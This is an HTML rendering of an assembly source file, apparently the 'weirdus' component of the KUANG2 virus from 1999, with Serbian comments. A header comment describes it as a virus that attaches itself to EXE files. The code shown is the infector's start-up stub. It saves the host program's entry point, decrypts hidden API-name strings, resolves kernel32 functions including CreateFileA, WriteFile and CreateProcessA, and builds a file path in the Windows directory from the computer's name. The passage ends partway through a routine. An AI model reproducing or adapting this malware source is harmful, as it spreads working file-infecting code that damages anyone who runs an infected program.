<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>weirdus.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;***[ThuNderSoft]*************************************************************</span><span class="sc0">
</span><span class="sc1">;                               KUANG2: weirdus</span><span class="sc0">
</span><span class="sc1">;                                  ver: 0.21</span><span class="sc0">
</span><span class="sc1">;                               ˙˘ƒÕ WEIRD Õƒ˘˙</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc1">;* HISTORY *</span><span class="sc0">
</span><span class="sc1">; ver 0.21 (18-may-1999): joÑ smanjenja (cmpname)</span><span class="sc0">
</span><span class="sc1">; ver 0.20 (08-mar-1999): standardni oblik radi</span><span class="sc0">
</span><span class="sc1">; ver 0.10 (29-jan-1999): born code</span><span class="sc0">

</span><span class="sc2">.387</span><span class="sc0">
</span><span class="sc2">.386p</span><span class="sc0">

</span><span class="sc1">;**   weirdus</span><span class="sc0">
</span><span class="sc1">;**   -------</span><span class="sc0">
</span><span class="sc1">;** ˛ Ovde se nalazi kod virusa koji se kaÅi na EXE fajlove</span><span class="sc0">
</span><span class="sc1">;** ˛ Ceo je u DATA segmentu jer nam je lakÑe da mu pristupamo iz Watcoma.</span><span class="sc0">
</span><span class="sc1">;**   Moglo je da bude i u CODE segmentu - tada bi morali da koristimo</span><span class="sc0">
</span><span class="sc1">;**   program PEWRSEC, ali dobija se isto</span><span class="sc0">
</span><span class="sc1">;** ˛ Obrati paÇnju: program ne sme da bude vezan direktno za bilo Ñta -</span><span class="sc0">
</span><span class="sc1">;**   sve mora da se radi preko ofseta</span><span class="sc0">
</span><span class="sc1">;** ˛ Zbog baga asemblera? ne moÇe da radi 'mov eax, [ebp + ofs1 - ofs2] (16 bitno?)</span><span class="sc0">
</span><span class="sc1">;**   Zato moramo da koristimo apsolutnu dodelu.</span><span class="sc0">
</span><span class="sc1">;** ˛ Trenutna veliÅina: 999 bajta</span><span class="sc0">


</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">weirdus.inc</span><span class="sc0">


</span><span class="sc5">_DATA</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc12">'DATA'</span><span class="sc0">
</span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">_DATA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">_DATA</span><span class="sc0">

</span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc5">_virus_start</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_virus_end</span><span class="sc0">
</span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc5">_oldEntryPoint</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_oldEntryPointRVA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_oldEPoffs</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_oldfilesize</span><span class="sc0">
</span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc5">_oldoffs1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_olddata1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_oldoffs2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_olddata2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_oldoffs3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_olddata3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_oldoffs4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_olddata4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_oldoffs5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_olddata5</span><span class="sc0">
</span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc5">_ddGetModuleHandleA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_ddGetProcAddress</span><span class="sc0">
</span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc5">_addfile_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_kript</span><span class="sc0">


</span><span class="sc1">;*******************</span><span class="sc0">
</span><span class="sc1">;*** Kod sekcija ***</span><span class="sc0">
</span><span class="sc1">;*******************</span><span class="sc0">

</span><span class="sc5">_virus_start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; saÅuvaj mesto za povratnu adresu (ka hostu)</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">letsgo</span><span class="sc0">

</span><span class="sc5">letsgo</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                 </span><span class="sc1">; pokupi IP (instruction pointer) od call-a</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">letsgo</span><span class="sc0">   </span><span class="sc1">; ebp sada pokazuje na podatke (_data_start)</span><span class="sc0">

</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">_OldEntryPoint</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; pokupi host EntryPoint</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; namesti oldEntrypoint hosta u stek</span><span class="sc0">


</span><span class="sc1">;***********************</span><span class="sc0">
</span><span class="sc1">;*** Inicijalizacija ***</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">

</span><span class="sc1">;prvo dekriptuj stringove f-ja</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">strKernel</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc10">@f</span><span class="sc0">                   </span><span class="sc1">; ako smo na kraju, skoÅi</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">@b</span><span class="sc0">                  </span><span class="sc1">; vrti petlju</span><span class="sc0">
</span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; esi = GetModuleHandleA(KERNEL32.DLL)</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">strKernel</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; Arg0 = LPCTSTR lpModuleName</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">_ddGetModuleHandleA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; call GetModuleHandleA</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">virus_exit</span><span class="sc0">           </span><span class="sc1">; ako je nastala greÑka, skoÅi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; esi = HMODULE (KERNEL32.DLL)</span><span class="sc0">


</span><span class="sc1">; GetProcAddress</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">_ddGetProcAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; prvo proveri da li je GetProcAddress</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; uvezena u ovom exe fajlu</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc10">@f</span><span class="sc0">                  </span><span class="sc1">; da, sve je u redu, idi dalje</span><span class="sc0">
                                </span><span class="sc1">; ne, ajd sad da probamo sami da naîemo</span><span class="sc0">

</span><span class="sc1">; Sam naîi adresu GetProcAddress ako moÇeÑ</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">strGetProcAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; Arg1 = LPCSTR lpProcName</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">; Arg0 = hModule (KERNEL32.DLL)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">WinGetProcAddress</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; da li je f-ja naîena?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">virus_exit</span><span class="sc0">           </span><span class="sc1">; nije, skoÅi</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">ddGetProcAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; zapamti adresu f-je</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; i pointer na adresu</span><span class="sc0">


</span><span class="sc1">;*******************************</span><span class="sc0">
</span><span class="sc1">;*** Naîi adrese WinAPI f-ja ***</span><span class="sc0">
</span><span class="sc1">;*******************************</span><span class="sc0">
</span><span class="sc1">; u cilju smanjenja koda obavezan je ovaj redosled f-ja!</span><span class="sc0">

</span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; GetProcAddress (GetWindowsDirectoryA)</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">strGetWindowsDirectoryA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">MyGetProcAddress</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">ddGetWindowsDirectoryA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; zapamti adresu f-je</span><span class="sc0">

</span><span class="sc1">; GetProcAddress (GetComputerNameA)</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">strGetComputerNameA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">MyGetProcAddress</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; zapamti adresu f-je</span><span class="sc0">

</span><span class="sc1">; GetProcAddress (CreateFileA)</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">strCreateFileA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">MyGetProcAddress</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; zapamti adresu f-je</span><span class="sc0">

</span><span class="sc1">; GetProcAddress (WriteFile)</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">strWriteFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">MyGetProcAddress</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; zapamti adresu f-je</span><span class="sc0">

</span><span class="sc1">; GetProcAddress (CloseHandle)</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">strCloseHandle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">MyGetProcAddress</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; zapamti adresu f-je</span><span class="sc0">

</span><span class="sc1">; GetProcAddress (CreateProcessA)</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">strCreateProcessA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">MyGetProcAddress</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; zapamti adresu f-je</span><span class="sc0">


</span><span class="sc1">;*******************************</span><span class="sc0">
</span><span class="sc1">;*** Priprema stringova itd. ***</span><span class="sc0">
</span><span class="sc1">;*******************************</span><span class="sc0">

</span><span class="sc1">; GetWindowsDirectoryA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">      </span><span class="sc1">; Arg1 = UINT Size</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; Arg0 = LPTSTR lpBuffer</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; call GetWindowsDirectoryA</span><span class="sc0">

</span><span class="sc1">; GetComputerNameA</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">cmpname_len</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; Arg1 = LPDWORD nSize</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">cmpname</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; Arg0 = LPTSTR lpBuffer</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; call GetComputerNameA</span><span class="sc0">

</span><span class="sc1">; formiraj jedinstveno ime fajla u filename</span><span class="sc0">
</span><span class="sc1">; lepo je Ñto ComputerName sadrÇi samo za fajlove validne karaktere!</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">cmpname</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; edx -&gt; cmpname</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; eax -&gt; filename</span><span class="sc0">
</span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc10">@f</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">@b</span><span class="sc0">
</span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'\' ; dodaj na kraj filename '</span><span class="sc0">\</span><span class="sc13">'
</span><span class="sc0">        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc10">@f</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">temp1</span><span class="sc0">                </span><span class="sc1">; ako nije veliko slovo idi dalje</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">              </span><span class="sc1">; veliko slovo pretvori u malo</span><span class="sc0">
</span><span class="sc5">temp1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc0">
